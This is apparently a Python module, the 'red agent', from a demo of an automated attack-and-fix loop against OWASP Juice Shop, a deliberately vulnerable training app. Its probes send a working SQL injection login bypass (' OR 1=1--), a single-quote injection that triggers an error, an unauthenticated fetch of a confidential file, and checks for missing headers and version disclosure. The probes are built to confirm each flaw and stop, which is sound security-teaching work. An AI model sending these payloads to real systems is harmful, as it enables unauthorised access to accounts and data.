"""Red agent — the attacker.

Each probe attempts one well-known Juice Shop weakness and, *only if it actually
triggers*, returns a confirmed ``Finding`` carrying the exact request it sent.
Nothing here is novel: these are the canonical tutorial vulnerabilities Juice
Shop ships on purpose (see https://pwning.owasp-juice.shop). The point of the
demo is the red->blue *loop*, not the exploits.

Design note (the "why"): every probe is written to *confirm and stop*, not to
exfiltrate. The SQLi probes check for an auth token or a DB error string; they
don't dump the users table. A finding is proof-of-presence, not a data heist.
"""
from __future__ import annotations

from typing import Callable

import requests

from .juice_shop import JuiceShopClient
from .models import Finding, HttpEvidence, OwaspCategory, Severity


def _excerpt(resp: requests.Response, n: int = 160) -> str:
    """First n chars of a response body, whitespace-collapsed. Evidence, not a dump."""
    return " ".join(resp.text[:n].split())


# --- individual probes -----------------------------------------------------
# Each returns a Finding if the weakness is live, else None.

def probe_sqli_login_bypass(c: JuiceShopClient) -> Finding | None:
    """A03 — authenticate as the first user (admin) without a password.

    Juice Shop builds its login SQL by string concatenation, so an email of
    ``' OR 1=1--`` comments out the password check. Confirmation = we get an
    auth token back.
    """
    payload = {"email": "' OR 1=1--", "password": "anything"}
    try:
        r = c.post("/rest/user/login", json=payload)
    except requests.RequestException:
        return None
    got_token = r.status_code == 200 and "authentication" in r.text.lower()
    if not got_token:
        return None
    return Finding(
        id="sqli-login-bypass",
        title="SQL injection authentication bypass",
        category=OwaspCategory.A03_INJECTION,
        severity=Severity.CRITICAL,
        summary="Logged in as the first registered user (admin) by injecting "
                "`' OR 1=1--` into the email field, bypassing the password check.",
        evidence=HttpEvidence(
            method="POST", path="/rest/user/login", body=payload,
            status_code=r.status_code, response_excerpt=_excerpt(r),
        ),
    )


def probe_sqli_search_error(c: JuiceShopClient) -> Finding | None:
    """A03 — the product-search endpoint leaks raw SQL errors.

    A single quote breaks the query and the backend returns the SQLite error
    verbatim, which both confirms injection and leaks the DB engine + schema.
    We send the breaking quote only — no UNION, no data extraction.
    """
    q = "'"
    try:
        r = c.get("/rest/products/search", params={"q": q})
    except requests.RequestException:
        return None
    leaked = r.status_code >= 500 and "SQLITE" in r.text.upper()
    if not leaked:
        return None
    return Finding(
        id="sqli-search-error-leak",
        title="SQL injection & verbose error leak in product search",
        category=OwaspCategory.A03_INJECTION,
        severity=Severity.HIGH,
        summary="The /rest/products/search endpoint concatenates the `q` param "
                "into SQL and returns the raw SQLite error, confirming injection "
                "and leaking the database engine.",
        evidence=HttpEvidence(
            method="GET", path="/rest/products/search?q='",
            status_code=r.status_code, response_excerpt=_excerpt(r),
        ),
    )


def probe_confidential_document(c: JuiceShopClient) -> Finding | None:
    """A01 — a confidential file is served straight from /ftp with no access control."""
    path = "/ftp/acquisitions.md"
    try:
        r = c.get(path)
    except requests.RequestException:
        return None
    exposed = r.status_code == 200 and "confidential" in r.text.lower()
    if not exposed:
        return None
    return Finding(
        id="confidential-document-exposure",
        title="Confidential document exposed via static file route",
        category=OwaspCategory.A01_BROKEN_ACCESS_CONTROL,
        severity=Severity.HIGH,
        summary="Retrieved an internal confidential document from /ftp with no "
                "authentication or authorisation required.",
        evidence=HttpEvidence(
            method="GET", path=path,
            status_code=r.status_code, response_excerpt=_excerpt(r),
        ),
    )


# Headers every modern web app should set. Absence is the misconfiguration.
_EXPECTED_HEADERS = {
    "Content-Security-Policy": "mitigates XSS and injection",
    "X-Frame-Options": "mitigates clickjacking",
    "Strict-Transport-Security": "enforces HTTPS",
    "X-Content-Type-Options": "stops MIME sniffing",
}


def probe_missing_security_headers(c: JuiceShopClient) -> Finding | None:
    """A05 — the app ships without the standard defensive response headers."""
    try:
        r = c.get("/")
    except requests.RequestException:
        return None
    present = {h.lower() for h in r.headers}
    missing = [h for h in _EXPECTED_HEADERS if h.lower() not in present]
    if not missing:
        return None
    return Finding(
        id="missing-security-headers",
        title="Missing HTTP security headers",
        category=OwaspCategory.A05_SECURITY_MISCONFIG,
        severity=Severity.MEDIUM,
        summary="Response is served without " + ", ".join(missing) +
                " — leaving the app open to XSS, clickjacking and downgrade attacks.",
        evidence=HttpEvidence(
            method="GET", path="/",
            status_code=r.status_code,
            response_excerpt="missing: " + ", ".join(missing),
        ),
    )


def probe_version_disclosure(c: JuiceShopClient) -> Finding | None:
    """A06 — the exact app version is published, handing attackers a CVE lookup."""
    path = "/rest/admin/application-version"
    try:
        r = c.get(path)
    except requests.RequestException:
        return None
    disclosed = r.status_code == 200 and "version" in r.text.lower()
    if not disclosed:
        return None
    return Finding(
        id="version-disclosure",
        title="Application version disclosure",
        category=OwaspCategory.A06_VULNERABLE_COMPONENTS,
        severity=Severity.LOW,
        summary="An unauthenticated endpoint returns the exact application "
                "version, letting an attacker match it to known CVEs.",
        evidence=HttpEvidence(
            method="GET", path=path,
            status_code=r.status_code, response_excerpt=_excerpt(r),
        ),
    )


PROBES: list[Callable[[JuiceShopClient], Finding | None]] = [
    probe_sqli_login_bypass,
    probe_sqli_search_error,
    probe_confidential_document,
    probe_missing_security_headers,
    probe_version_disclosure,
]


class RedAgent:
    """Runs every probe against a live target and collects confirmed findings."""

    def __init__(self, client: JuiceShopClient):
        self.client = client

    def scan(self, on_event=None) -> list[Finding]:
        findings: list[Finding] = []
        for probe in PROBES:
            name = probe.__name__.replace("probe_", "")
            if on_event:
                on_event("probe_start", {"probe": name})
            finding = probe(self.client)
            if finding:
                findings.append(finding)
                if on_event:
                    on_event("finding", finding.to_dict())
            elif on_event:
                on_event("probe_clear", {"probe": name})
        return findings


def canned_findings() -> list[Finding]:
    """Realistic findings for ``--mode replay`` so the demo runs with zero setup.

    These mirror exactly what the live probes above return against a default
    Juice Shop, so the dashboard looks identical whether or not a target is up.
    """
    return [
        Finding("sqli-login-bypass", "SQL injection authentication bypass",
                OwaspCategory.A03_INJECTION, Severity.CRITICAL,
                "Logged in as the first registered user (admin) by injecting "
                "`' OR 1=1--` into the email field, bypassing the password check.",
                HttpEvidence("POST", "/rest/user/login",
                             {"email": "' OR 1=1--", "password": "anything"},
                             status_code=200,
                             response_excerpt='{"authentication":{"token":"eyJ...","bid":1}}')),
        Finding("sqli-search-error-leak",
                "SQL injection & verbose error leak in product search",
                OwaspCategory.A03_INJECTION, Severity.HIGH,
                "The /rest/products/search endpoint concatenates the `q` param "
                "into SQL and returns the raw SQLite error, confirming injection.",
                HttpEvidence("GET", "/rest/products/search?q='", status_code=500,
                             response_excerpt="SQLITE_ERROR: unrecognized token near ...")),
        Finding("confidential-document-exposure",
                "Confidential document exposed via static file route",
                OwaspCategory.A01_BROKEN_ACCESS_CONTROL, Severity.HIGH,
                "Retrieved an internal confidential document from /ftp with no "
                "authentication or authorisation required.",
                HttpEvidence("GET", "/ftp/acquisitions.md", status_code=200,
                             response_excerpt="# Acquisition Of ... (confidential)")),
        Finding("missing-security-headers", "Missing HTTP security headers",
                OwaspCategory.A05_SECURITY_MISCONFIG, Severity.MEDIUM,
                "Response is served without Content-Security-Policy, "
                "X-Frame-Options, Strict-Transport-Security, X-Content-Type-Options.",
                HttpEvidence("GET", "/", status_code=200,
                             response_excerpt="missing: Content-Security-Policy, "
                             "X-Frame-Options, Strict-Transport-Security, X-Content-Type-Options")),
        Finding("version-disclosure", "Application version disclosure",
                OwaspCategory.A06_VULNERABLE_COMPONENTS, Severity.LOW,
                "An unauthenticated endpoint returns the exact application "
                "version, letting an attacker match it to known CVEs.",
                HttpEvidence("GET", "/rest/admin/application-version", status_code=200,
                             response_excerpt='{"version":"20.2.0"}')),
    ]
